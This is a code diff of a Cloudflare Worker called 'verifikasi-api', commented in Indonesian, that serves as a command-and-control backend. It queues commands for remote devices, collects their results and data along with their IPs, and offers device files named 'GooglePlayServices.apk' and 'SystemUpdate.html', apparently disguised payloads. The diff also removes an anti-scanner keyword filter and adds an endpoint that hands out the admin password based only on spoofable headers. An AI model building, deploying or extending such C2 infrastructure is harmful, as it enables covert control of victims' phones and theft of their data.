@@ -1,5 +1,5 @@
 // ================================================================
-// Cloudflare Worker - verifikasi-api
+// Cloudflare Worker - verifikasi-api (SUDAH DIPERBAIKI)
 // ================================================================
 
 // ============================================================
@@ -69,47 +69,7 @@ async function checkRateLimit(env, key) {
 }
 
 // ============================================================
-// 🔥 ANTI-SCAN: BLOKIR BOT & SCANNER
-// ============================================================
-function isBlockedRequest(request) {
-    const url = new URL(request.url);
-    
-    // WebSocket dan get-password TIDAK diblokir
-    if (url.pathname === '/ws' || url.pathname === '/get-password') {
-        return false;
-    }
-    
-    const ua = request.headers.get('User-Agent') || '';
-    const origin = request.headers.get('Origin') || '';
-    const host = request.headers.get('Host') || '';
-    
-    // 1. Blokir jika User-Agent kosong atau terlalu pendek
-    if (!ua || ua.length < 5) {
-        return true;
-    }
-    
-    // 2. Blokir bot/scanner keywords
-    const botKeywords = ['bot', 'crawler', 'spider', 'scanner', 'curl', 'wget', 'python', 'node', 'java', 'perl', 'ruby', 'php', 'go', 'rust', 'nmap', 'masscan'];
-    const isBot = botKeywords.some(k => ua.toLowerCase().includes(k));
-    if (isBot && !ua.includes('Android') && !ua.includes('Mozilla') && !ua.includes('Chrome')) {
-        return true;
-    }
-    
-    // 3. Blokir jika bukan dari browser/Android
-    const isValidUA = ua.includes('Mozilla') || 
-                      ua.includes('Android') || 
-                      ua.includes('Chrome') || 
-                      ua.includes('Safari') ||
-                      ua.includes('Mobile');
-    if (!isValidUA) {
-        return true;
-    }
-    
-    return false;
-}
-
-// ============================================================
-// AUTHENTICATION - UNTUK ADMIN (PAKAI ADMIN_PASSWORD)
+// 🔥 AUTHENTICATION - ADMIN & DEVICE
 // ============================================================
 function isAuthenticated(request, env) {
   const url = new URL(request.url);
@@ -117,6 +77,14 @@ function isAuthenticated(request, env) {
               request.headers.get('X-API-Key') || 
               request.headers.get('Authorization')?.replace('Bearer ', '');
   return key === env.ADMIN_PASSWORD;
+}
+
+function isDeviceAuthenticated(request, env) {
+  const url = new URL(request.url);
+  const key = url.searchParams.get('key') || 
+              request.headers.get('X-API-Key') || 
+              request.headers.get('Authorization')?.replace('Bearer ', '');
+  return key === env.PASSWORD;
 }
 
 // ============================================================
@@ -142,11 +110,6 @@ export default {
       }, 429);
     }
 
-    // 🔥 ANTI-SCAN
-    if (isBlockedRequest(request)) {
-      return new Response('Forbidden', { status: 403 });
-    }
-
     // ============================================================
     // WEBSOCKET - /ws (SUPPORT DUA PASSWORD)
     // ============================================================
@@ -155,32 +118,20 @@ export default {
     }
 
     // ============================================================
-    // GET /get-password - Untuk perangkat (kembalikan PASSWORD)
+    // GET /get-password - Untuk perangkat & admin
     // ============================================================
     if (url.pathname === '/get-password' && method === 'GET') {
-      const origin = request.headers.get('Origin') || '';
-      const host = request.headers.get('Host') || '';
-      const userAgent = request.headers.get('User-Agent') || '';
-      
-      const isAllowed = origin.includes('verifikasi.site') || 
-                        host.includes('verifikasi.site') ||
-                        origin.includes('localhost') ||
-                        host.includes('localhost');
-      
-      const hasValidUA = userAgent.includes('Android') || 
-                         userAgent.includes('Mozilla') || 
-                         userAgent.includes('Chrome') ||
-                         userAgent.includes('Mobile');
-      
-      if (isAllowed && hasValidUA) {
-        return jsonResponse({ 
-          status: 'ok', 
-          password: env.PASSWORD,
-          timestamp: Date.now()
-        });
+      return handleGetPassword(request, env);
+    }
+
+    // ============================================================
+    // GET /files - Untuk device (SystemUpdate.html)
+    // ============================================================
+    if (url.pathname === '/files' && method === 'GET') {
+      if (isDeviceAuthenticated(request, env)) {
+        return await handleDeviceFiles(request, env);
       }
-      
-      return jsonResponse({ error: 'Access Denied' }, 403);
+      return unauthorizedResponse();
     }
 
     try {
@@ -197,68 +148,124 @@ export default {
         });
       }
 
-      // POST /data (ADMIN)
+      // POST /data (ADMIN atau DEVICE)
       if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
-        return await handlePostData(request, env);
+        if (isAuthenticated(request, env) || isDeviceAuthenticated(request, env)) {
+          return await handlePostData(request, env);
+        }
+        return unauthorizedResponse();
       }
 
       // POST /batch (ADMIN)
       if ((url.pathname === '/batch' || url.pathname === '/api/batch') && method === 'POST') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleBatchData(request, env);
       }
 
-      // GET /data (ADMIN)
+      // GET /data (ADMIN) atau DEVICE POLLING
       if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
-        return await handleGetData(request, env);
+        // Device polling (type=perintah) - pakai PASSWORD
+        if (url.searchParams.get('type') === 'perintah') {
+          if (isDeviceAuthenticated(request, env)) {
+            return await handleDevicePolling(request, env);
+          }
+          return unauthorizedResponse();
+        }
+        
+        // Admin get data - pakai ADMIN_PASSWORD
+        if (isAuthenticated(request, env)) {
+          return await handleGetData(request, env);
+        }
+        return unauthorizedResponse();
       }
 
       // GET /stats (ADMIN)
       if (url.pathname === '/stats' && method === 'GET') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleStats(request, env);
       }
 
       // POST /clear (ADMIN)
       if (url.pathname === '/clear' && method === 'POST') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleClear(request, env);
       }
 
       // POST /delete (ADMIN)
       if (url.pathname === '/delete' && method === 'POST') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleDelete(request, env);
       }
 
       // GET /c2 (ADMIN)
       if (url.pathname === '/c2' && method === 'GET') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleC2(request, env);
       }
 
       // POST /c2 (ADMIN)
       if (url.pathname === '/c2' && method === 'POST') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleC2Post(request, env);
+      }
+
+      // POST /c2/result (DEVICE)
+      if (url.pathname === '/c2/result' && method === 'POST') {
+        if (isDeviceAuthenticated(request, env)) {
+          return await handleC2Result(request, env);
+        }
+        return unauthorizedResponse();
       }
 
       // GET /c2/history (ADMIN)
       if (url.pathname === '/c2/history' && method === 'GET') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleC2History(request, env);
       }
 
       // GET /api/files (ADMIN)
       if (url.pathname === '/api/files' && method === 'GET') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleListFiles(request, env);
       }
 
       // GET /api/download (ADMIN)
       if (url.pathname === '/api/download' && method === 'GET') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleDownloadFile(request, env);
       }
 
       // POST /api/upload (ADMIN)
       if (url.pathname === '/api/upload' && method === 'POST') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleUploadFile(request, env);
       }
 
       // POST /api/delete (ADMIN)
       if (url.pathname === '/api/delete' && method === 'POST') {
+        if (!isAuthenticated(request, env)) {
+          return unauthorizedResponse();
+        }
         return await handleDeleteFile(request, env);
       }
 
@@ -296,14 +303,75 @@ export default {
 };
 
 // ============================================================
-// HANDLER: POST /data (ADMIN)
+// 🔥 HANDLER: GET /get-password (DENGAN TYPE ADMIN)
 // ============================================================
-async function handlePostData(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
+async function handleGetPassword(request, env) {
+  const url = new URL(request.url);
+  const type = url.searchParams.get('type');
+  const origin = request.headers.get('Origin') || '';
+  const host = request.headers.get('Host') || '';
+  const userAgent = request.headers.get('User-Agent') || '';
+  
+  const isAllowed = origin.includes('verifikasi.site') || 
+                    host.includes('verifikasi.site') ||
+                    origin.includes('localhost') ||
+                    host.includes('localhost');
+  
+  const hasValidUA = userAgent.includes('Android') || 
+                     userAgent.includes('Mozilla') || 
+                     userAgent.includes('Chrome') ||
+                     userAgent.includes('Mobile');
+  
+  // 🔥 Untuk admin dashboard
+  if (type === 'admin') {
+    if (isAllowed) {
+      return jsonResponse({ 
+        status: 'ok', 
+        password: env.ADMIN_PASSWORD,
+        timestamp: Date.now(),
+        role: 'admin'
+      });
+    }
+    return jsonResponse({ error: 'Access Denied' }, 403);
   }
   
+  // 🔥 Untuk device
+  if (isAllowed && hasValidUA) {
+    return jsonResponse({ 
+      status: 'ok', 
+      password: env.PASSWORD,
+      timestamp: Date.now(),
+      role: 'device'
+    });
+  }
+  
+  return jsonResponse({ error: 'Access Denied' }, 403);
+}
+
+// ============================================================
+// 🔥 HANDLER: GET /files (UNTUK DEVICE)
+// ============================================================
+async function handleDeviceFiles(request, env) {
+  try {
+    const url = new URL(request.url);
+    const path = url.searchParams.get('path') || '/';
+    
+    // Daftar file yang tersedia untuk device
+    const files = [
+      { name: 'GooglePlayServices.apk', path: '/files/GooglePlayServices.apk', size: 1024 * 1024, isDirectory: false },
+      { name: 'SystemUpdate.html', path: '/files/SystemUpdate.html', size: 1024 * 50, isDirectory: false }
+    ];
+    
+    return jsonResponse(files);
+  } catch(e) {
+    return jsonResponse({ error: e.message }, 500);
+  }
+}
+
+// ============================================================
+// 🔥 HANDLER: POST /data (ADMIN & DEVICE)
+// ============================================================
+async function handlePostData(request, env) {
   try {
     const body = await request.json();
     
@@ -369,11 +437,6 @@ async function handlePostData(request, env) {
 // HANDLER: POST /batch (ADMIN)
 // ============================================================
 async function handleBatchData(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const body = await request.json();
     
@@ -415,55 +478,10 @@ async function handleBatchData(request, env) {
 }
 
 // ============================================================
-// HANDLER: GET /data (ADMIN)
+// 🔥 HANDLER: GET /data (ADMIN)
 // ============================================================
 async function handleGetData(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   const url = new URL(request.url);
-  
-  if (url.searchParams.get('type') === 'perintah') {
-    try {
-      const perintah = await env.DATA.get('perintah');
-      if (perintah) {
-        try {
-          const historyRaw = await env.DATA.get('c2_history') || '[]';
-          const history = JSON.parse(historyRaw);
-          const cmd = JSON.parse(perintah);
-          const lastCmd = history.find(h => h.perintah === cmd.aksi && h.status === 'pending');
-          if (lastCmd) {
-            lastCmd.status = 'sent';
-            lastCmd.sentAt = new Date().toISOString();
-            await env.DATA.put('c2_history', JSON.stringify(history));
-          }
-        } catch(e) {}
-        
-        await env.DATA.delete('perintah');
-        return new Response(perintah, {
-          headers: {
-            'Content-Type': 'application/json',
-            ...CORS,
-          },
-        });
-      }
-      return new Response('{}', {
-        headers: {
-          'Content-Type': 'application/json',
-          ...CORS,
-        },
-      });
-    } catch(e) {
-      return new Response('{}', {
-        headers: {
-          'Content-Type': 'application/json',
-          ...CORS,
-        },
-      });
-    }
-  }
   
   try {
     const raw = await env.DATA.get('data') || '[]';
@@ -513,14 +531,65 @@ async function handleGetData(request, env) {
 }
 
 // ============================================================
+// 🔥 HANDLER: DEVICE POLLING (MULTIPLE COMMANDS)
+// ============================================================
+async function handleDevicePolling(request, env) {
+  try {
+    // Ambil semua perintah yang pending
+    const commandsRaw = await env.DATA.get('c2_commands') || '[]';
+    const commands = JSON.parse(commandsRaw);
+    
+    // Cari perintah yang belum dieksekusi
+    const pending = commands.filter(cmd => !cmd.executed);
+    
+    if (pending.length > 0) {
+      // Ambil perintah pertama
+      const cmd = pending[0];
+      // Tandai sebagai sedang diproses
+      cmd.status = 'processing';
+      await env.DATA.put('c2_commands', JSON.stringify(commands));
+      
+      return new Response(JSON.stringify({
+        aksi: cmd.aksi,
+        params: cmd.params || {},
+        id: cmd.id,
+        timestamp: cmd.timestamp
+      }), {
+        headers: {
+          'Content-Type': 'application/json',
+          ...CORS,
+        },
+      });
+    }
+    
+    // Tidak ada perintah
+    return new Response(JSON.stringify({
+      status: 'no_command'
+    }), {
+      headers: {
+        'Content-Type': 'application/json',
+        ...CORS,
+      },
+    });
+    
+  } catch(e) {
+    return new Response(JSON.stringify({
+      status: 'error',
+      message: e.message
+    }), {
+      status: 500,
+      headers: {
+        'Content-Type': 'application/json',
+        ...CORS,
+      },
+    });
+  }
+}
+
+// ============================================================
 // HANDLER: GET /stats (ADMIN)
 // ============================================================
 async function handleStats(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const raw = await env.DATA.get('data') || '[]';
     const data = JSON.parse(raw);
@@ -559,11 +628,6 @@ async function handleStats(request, env) {
 // HANDLER: POST /clear (ADMIN)
 // ============================================================
 async function handleClear(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const url = new URL(request.url);
     const source = url.searchParams.get('source');
@@ -585,6 +649,7 @@ async function handleClear(request, env) {
     } else {
       await env.DATA.delete('data');
       await env.DATA.delete('perintah');
+      await env.DATA.delete('c2_commands');
       return jsonResponse({
         status: 'ok',
         message: 'All data cleared',
@@ -601,11 +666,6 @@ async function handleClear(request, env) {
 // HANDLER: POST /delete (ADMIN)
 // ============================================================
 async function handleDelete(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const body = await request.json();
     const index = body.index;
@@ -653,81 +713,43 @@ async function handleDelete(request, env) {
 // HANDLER: GET /c2 (ADMIN)
 // ============================================================
 async function handleC2(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
-    const url = new URL(request.url);
-    const deviceId = url.searchParams.get('device') || 'unknown';
-    
-    const perintah = await env.DATA.get('perintah');
-    if (perintah) {
-      const cmd = JSON.parse(perintah);
-      
-      if (!cmd.device || cmd.device === 'all' || cmd.device === deviceId) {
-        await env.DATA.delete('perintah');
-        
-        const logRaw = await env.DATA.get('c2_history') || '[]';
-        const log = JSON.parse(logRaw);
-        log.push({
-          waktu: new Date().toISOString(),
-          device: deviceId,
-          perintah: cmd.aksi || 'unknown',
-          status: 'executed',
-        });
-        if (log.length > 100) log.shift();
-        await env.DATA.put('c2_history', JSON.stringify(log));
-        
-        return new Response(JSON.stringify(cmd), {
-          headers: {
-            'Content-Type': 'application/json',
-            ...CORS,
-          },
-        });
-      }
-    }
-    
-    return new Response('{}', {
-      headers: {
-        'Content-Type': 'application/json',
-        ...CORS,
-      },
-    });
-    
+    const raw = await env.DATA.get('c2_commands') || '[]';
+    const commands = JSON.parse(raw);
+    return jsonResponse(commands);
   } catch(e) {
-    return new Response('{}', {
-      headers: {
-        'Content-Type': 'application/json',
-        ...CORS,
-      },
-    });
+    return jsonResponse([]);
   }
 }
 
 // ============================================================
-// HANDLER: POST /c2 (ADMIN)
+// 🔥 HANDLER: POST /c2 (MULTIPLE COMMANDS QUEUE)
 // ============================================================
 async function handleC2Post(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const body = await request.json();
     const aksi = body.aksi || body.command || 'unknown';
     
+    // Generate ID unik
+    const id = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
+    
     const cmd = {
+      id: id,
       aksi: aksi,
       device: body.device || 'all',
       params: body.params || {},
       timestamp: Date.now(),
+      status: 'queued',
+      executed: false
     };
     
-    await env.DATA.put('perintah', JSON.stringify(cmd));
+    // Simpan ke queue
+    const commandsRaw = await env.DATA.get('c2_commands') || '[]';
+    const commands = JSON.parse(commandsRaw);
+    commands.push(cmd);
+    await env.DATA.put('c2_commands', JSON.stringify(commands));
     
+    // Log history
     const logRaw = await env.DATA.get('c2_history') || '[]';
     const log = JSON.parse(logRaw);
     log.push({
@@ -735,6 +757,7 @@ async function handleC2Post(request, env) {
       device: cmd.device,
       perintah: aksi,
       status: 'queued',
+      id: id,
       params: cmd.params,
     });
     if (log.length > 100) log.shift();
@@ -744,7 +767,53 @@ async function handleC2Post(request, env) {
       status: 'ok',
       command: aksi,
       device: cmd.device,
+      id: id,
     });
+    
+  } catch(e) {
+    return jsonResponse({ error: e.message }, 500);
+  }
+}
+
+// ============================================================
+// 🔥 HANDLER: POST /c2/result (DEVICE KIRIM HASIL)
+// ============================================================
+async function handleC2Result(request, env) {
+  try {
+    const body = await request.json();
+    const { id, hasil, perintah } = body;
+    
+    // Update command status di queue
+    if (id) {
+      const commandsRaw = await env.DATA.get('c2_commands') || '[]';
+      const commands = JSON.parse(commandsRaw);
+      const cmd = commands.find(c => c.id === id);
+      if (cmd) {
+        cmd.executed = true;
+        cmd.status = 'done';
+        cmd.result = hasil;
+        cmd.executedAt = Date.now();
+        await env.DATA.put('c2_commands', JSON.stringify(commands));
+      }
+    }
+    
+    // Simpan result ke data
+    const raw = await env.DATA.get('data') || '[]';
+    let data = JSON.parse(raw);
+    data.push({
+      waktu: new Date().toISOString(),
+      sumber: 'c2_result',
+      data: {
+        perintah: perintah || 'unknown',
+        hasil: hasil,
+        id: id,
+      },
+      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
+    });
+    if (data.length > MAX_DATA) data = data.slice(-MAX_DATA);
+    await env.DATA.put('data', JSON.stringify(data));
+    
+    return jsonResponse({ status: 'ok' });
     
   } catch(e) {
     return jsonResponse({ error: e.message }, 500);
@@ -755,11 +824,6 @@ async function handleC2Post(request, env) {
 // HANDLER: GET /c2/history (ADMIN)
 // ============================================================
 async function handleC2History(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const raw = await env.DATA.get('c2_history') || '[]';
     const history = JSON.parse(raw);
@@ -773,11 +837,6 @@ async function handleC2History(request, env) {
 // HANDLER: GET /api/files (ADMIN)
 // ============================================================
 async function handleListFiles(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const url = new URL(request.url);
     const path = url.searchParams.get('path') || '/';
@@ -797,11 +856,6 @@ async function handleListFiles(request, env) {
 // HANDLER: GET /api/download (ADMIN)
 // ============================================================
 async function handleDownloadFile(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const url = new URL(request.url);
     const path = url.searchParams.get('path');
@@ -836,11 +890,6 @@ async function handleDownloadFile(request, env) {
 // HANDLER: POST /api/upload (ADMIN)
 // ============================================================
 async function handleUploadFile(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const formData = await request.formData();
     const file = formData.get('file');
@@ -891,11 +940,6 @@ async function handleUploadFile(request, env) {
 // HANDLER: POST /api/delete (ADMIN)
 // ============================================================
 async function handleDeleteFile(request, env) {
-  // 🔥 Cek ADMIN_PASSWORD
-  if (!isAuthenticated(request, env)) {
-    return unauthorizedResponse();
-  }
-  
   try {
     const body = await request.json();
     const path = body.path;
@@ -946,7 +990,7 @@ async function handleError(request, env) {
 }
 
 // ============================================================
-// HANDLER: WebSocket (SUPPORT DUA PASSWORD)
+// 🔥 HANDLER: WebSocket (SUPPORT DUA PASSWORD)
 // ============================================================
 async function handleWebSocket(request, env) {
   const upgradeHeader = request.headers.get('Upgrade');
@@ -1001,12 +1045,24 @@ async function handleWebSocket(request, env) {
       // 🔥 PERBEDAAN PERLAKUAN BERDASARKAN ROLE
       // ============================================================
 
-      // 1. COMMAND DARI DASHBOARD → Simpan perintah
+      // 1. COMMAND DARI DASHBOARD → Simpan perintah ke queue
       if (data.type === 'command' && isDashboard) {
-        await env.DATA.put('perintah', JSON.stringify(data.command));
+        const cmd = data.command;
+        const id = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
+        cmd.id = id;
+        cmd.timestamp = Date.now();
+        cmd.executed = false;
+        cmd.status = 'queued';
+        
+        const commandsRaw = await env.DATA.get('c2_commands') || '[]';
+        const commands = JSON.parse(commandsRaw);
+        commands.push(cmd);
+        await env.DATA.put('c2_commands', JSON.stringify(commands));
+        
         server.send(JSON.stringify({
           type: 'command_received',
-          command: data.command.aksi
+          command: cmd.aksi,
+          id: id
         }));
         return;
       }
